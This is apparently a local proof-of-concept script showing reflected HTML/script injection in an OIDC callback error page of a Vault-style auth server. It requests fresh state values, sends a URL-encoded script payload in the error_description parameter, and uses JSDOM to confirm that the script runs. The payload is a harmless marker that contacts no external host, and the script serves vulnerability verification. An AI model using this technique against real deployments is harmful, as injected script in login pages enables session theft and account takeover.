#!/usr/bin/env bash
set -Eeuo pipefail

# End-to-end local PoC for the direct OIDC callback HTML injection.
# The only target interaction is the normal auth_url -> callback HTTP flow.

BASE_URL='http://127.0.0.1:8200'
AUTH_PATH='/v1/auth/oidc/oidc/auth_url'
CALLBACK_PATH='/v1/auth/oidc/oidc/callback'
REDIRECT_URI="${BASE_URL}/ui/vault/auth/oidc/oidc/callback"
EVIDENCE_DIR='/home/playground/output/attempt_1/evidence'
mkdir -p "$EVIDENCE_DIR"
exec > >(tee "$EVIDENCE_DIR/run.log") 2>&1

echo "[poc] target: ${BASE_URL}"
echo "[poc] evidence: ${EVIDENCE_DIR}"

health_code=$(curl -sS -D "$EVIDENCE_DIR/health.headers" \
  -o "$EVIDENCE_DIR/health.body" -w '%{http_code}' \
  "$BASE_URL/v1/sys/health")
if [[ "$health_code" != 200 ]]; then
  echo "[poc] FAIL: health endpoint returned ${health_code}" >&2
  exit 1
fi

get_state() {
  local name="$1"
  local nonce="$2"
  local request_file="$EVIDENCE_DIR/${name}.auth_url.request.json"
  local headers_file="$EVIDENCE_DIR/${name}.auth_url.response.headers"
  local body_file="$EVIDENCE_DIR/${name}.auth_url.response.body"

  printf '{"role":"lab-direct","redirect_uri":"%s","client_nonce":"%s"}\n' \
    "$REDIRECT_URI" "$nonce" > "$request_file"
  local code
  code=$(curl -sS -X POST -D "$headers_file" -o "$body_file" \
    -H 'Content-Type: application/json' \
    --data-binary "@$request_file" -w '%{http_code}' \
    "$BASE_URL$AUTH_PATH")
  if [[ "$code" != 200 ]]; then
    echo "[poc] FAIL: ${name} auth_url returned ${code}" >&2
    exit 1
  fi

  jq -er '.data.auth_url and (.data.state | strings | select(length > 0))' \
    "$body_file" >/dev/null
  jq -er '.data.state' "$body_file"
}

get_callback() {
  local name="$1"
  local state="$2"
  local encoded_detail="$3"
  local url="${BASE_URL}${CALLBACK_PATH}?state=${state}&error_description=${encoded_detail}"

  printf 'GET %s\nHost: 127.0.0.1:8200\n\n' "$url" \
    > "$EVIDENCE_DIR/${name}.callback.request"
  local code
  code=$(curl -sS -G -D "$EVIDENCE_DIR/${name}.callback.response.headers" \
    -o "$EVIDENCE_DIR/${name}.callback.response.body" -w '%{http_code}' \
    "$url")
  printf '%s\n' "$code" > "$EVIDENCE_DIR/${name}.callback.status"
  if [[ "$code" != 400 ]]; then
    echo "[poc] FAIL: ${name} callback returned ${code}, expected 400" >&2
    exit 1
  fi
}

# Each callback receives a distinct, fresh server-issued state.
benign_state=$(get_state benign 'local-poc-benign-nonce')
xss_state=$(get_state xss 'local-poc-xss-nonce')
if [[ "$benign_state" == "$xss_state" ]]; then
  echo '[poc] FAIL: auth_url did not issue distinct fresh states' >&2
  exit 1
fi

# The marker is harmless and self-contained: it contacts no external listener.
benign_detail='Local+identity+provider+denied+this+request.'
xss_detail='%3Cscript%3Ewindow.__local_marker%3Dtrue%3Bdocument.title%3D%27LOCAL_OIDC_XSS_POC_20261008%27%3C%2Fscript%3E'
get_callback benign "$benign_state" "$benign_detail"
get_callback xss "$xss_state" "$xss_detail"

for name in benign xss; do
  grep -Eiq '^Content-Type:.*text/html' \
    "$EVIDENCE_DIR/${name}.callback.response.headers" || {
      echo "[poc] FAIL: ${name} response was not text/html" >&2
      exit 1
    }
  grep -Eiq '^Cache-Control:.*no-store' \
    "$EVIDENCE_DIR/${name}.callback.response.headers" || {
      echo "[poc] FAIL: ${name} response lacked no-store" >&2
      exit 1
    }
done

export EVIDENCE_DIR
/opt/node/bin/node <<'NODE'
const fs = require('fs');
const { JSDOM } = require('jsdom');

const dir = process.env.EVIDENCE_DIR;
const expectedTitle = 'LOCAL_OIDC_XSS_POC_20261008';
const benignText = 'Local identity provider denied this request.';
const result = {};

function inspect(name) {
  const html = fs.readFileSync(`${dir}/${name}.callback.response.body`, 'utf8');
  const dom = new JSDOM(html, {
    url: 'http://127.0.0.1:8200/ui/vault/auth/oidc/oidc/callback',
    runScripts: 'dangerously',
  });
  return {
    html,
    marker: dom.window.__local_marker === true,
    title: dom.window.document.title,
    text: dom.window.document.body.textContent || '',
  };
}

const benign = inspect('benign');
const xss = inspect('xss');
result.benign = {
  reflected_text: benign.text.includes(benignText),
  script_executed: benign.marker || benign.title === expectedTitle,
};
result.xss = {
  raw_script_present: xss.html.includes('<script>window.__local_marker=true;'),
  script_executed: xss.marker && xss.title === expectedTitle,
};
fs.writeFileSync(`${dir}/oracle.json`, `${JSON.stringify(result, null, 2)}\n`);

if (!result.benign.reflected_text || result.benign.script_executed ||
    !result.xss.raw_script_present || !result.xss.script_executed) {
  console.error('[poc] FAIL: DOM oracle did not observe the validated distinction');
  console.error(JSON.stringify(result));
  process.exit(1);
}

console.log('[poc] benign control: reflected text, script_executed=false');
console.log('[poc] injection marker: raw script present, script_executed=true');
console.log(`[poc] document.title=${xss.title}`);
NODE

echo '[poc] PASS: direct callback failure page executed the harmless local marker'
